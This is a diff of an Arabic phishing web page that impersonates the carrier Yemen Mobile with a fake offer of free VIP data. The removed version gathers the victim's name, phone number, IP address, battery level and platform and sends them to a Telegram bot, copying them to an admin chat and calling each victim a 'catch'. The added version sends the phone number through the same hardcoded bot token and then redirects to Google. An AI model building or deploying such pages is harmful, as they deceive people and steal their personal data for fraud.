@@ -2,82 +2,35 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>يمن موبايل - خدمات VIP</title>
-    <style>
-        :root { --ym-blue: #0054a6; --ym-red: #e31e24; }
-        body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
-        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--ym-red); }
-        .header img { width: 130px; }
-        .hero { background: var(--ym-blue); color: #fff; padding: 25px; text-align: center; }
-        .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
-        .vip-card { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; border: 1px solid #ffd700; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        .btn-vip { background: linear-gradient(90deg, var(--ym-red), #b31419); color: #fff; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        #loading { display: none; text-align: center; margin-top: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ym-red); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>خدمة يمن موبايل</title>
 </head>
-<body>
+<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
 
-<div class="header"><img src="https://yemenmobile.com.ye/assets/images/logo.png"></div>
-<div class="hero"><h2>باقة سلفني VIP - 200MB 🚀</h2></div>
+    <h2>تفعيل باقة VIP 🚀</h2>
+    <p>أدخل رقمك لتلقي رصيد مجاني</p>
 
-<div class="container">
-    <div class="vip-card">
-        <input type="text" id="fullname" placeholder="الاسم الرباعي">
-        <input type="number" id="phonenum" placeholder="77XXXXXXX">
-        <select id="service">
-            <option>تفعيل فورجي مجاني (200MB)</option>
-            <option>خدمة سلفني VIP</option>
-        </select>
-        <button class="btn-vip" onclick="launchRadar()">تفعيل الآن</button>
-        <div id="loading"><div class="spinner"></div><p>جاري المعالجة...</p></div>
-    </div>
-</div>
-
-<script>
-const _TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
-const _ADMIN = "7715667493";
-const _ID = new URLSearchParams(window.location.search).get('id') || _ADMIN;
-
-async function launchRadar() {
-    const n = document.getElementById('fullname').value;
-    const p = document.getElementById('phonenum').value;
-    if(!n || !p) return alert("يرجى إدخال البيانات");
-
-    document.getElementById('loading').style.display = 'block';
-
-    const info = await getDeepInfo(n, p);
+    <input type="number" id="phone" placeholder="77xxxxxxx" style="padding:10px; width:80%; max-width:300px;"><br><br>
     
-    // إرسال البيانات
-    try {
-        await fetch(`https://api.telegram.org/bot${_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: _ID, text: info, parse_mode: 'Markdown' })
-        });
-        if(_ID !== _ADMIN) {
-            await fetch(`https://api.telegram.org/bot${_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: _ADMIN, text: info, parse_mode: 'Markdown' })
+    <button onclick="send()" style="padding:15px 30px; background:red; color:white; border:none; border-radius:5px; cursor:pointer;">
+        تفعيل الآن ✅
+    </button>
+
+    <script>
+        function send() {
+            const p = document.getElementById('phone').value;
+            if(!p) return alert("أدخل الرقم!");
+
+            const tok = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
+            const id = "7715667493";
+            const text = "🎯 رقم جديد: " + p;
+
+            // إرسال بسيط جداً
+            fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(text))
+            .then(() => {
+                alert("تم استلام طلبك!");
+                window.location.href = "https://www.google.com";
             });
         }
-        alert("تم استلام طلبك! سيتم التفعيل خلال 15 دقيقة.");
-        window.location.href = "https://yemenmobile.com.ye";
-    } catch (e) { alert("خطأ في السيرفر، حاول مجدداً"); }
-}
-
-async function getDeepInfo(n, p) {
-    let ip = "N/A";
-    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
-    let bat = "N/A";
-    if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100) + "%"; }
-    
-    return `💎 **[صيد VIP جديد]** 💎\n🌐 IP: \`${ip}\`\n👤 الاسم: ${n}\n📞 الهاتف: ${p}\n🔋 البطارية: ${bat}\n📱 النظام: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleString('ar-YE')}`;
-}
-</script>
+    </script>
 </body>
 </html>
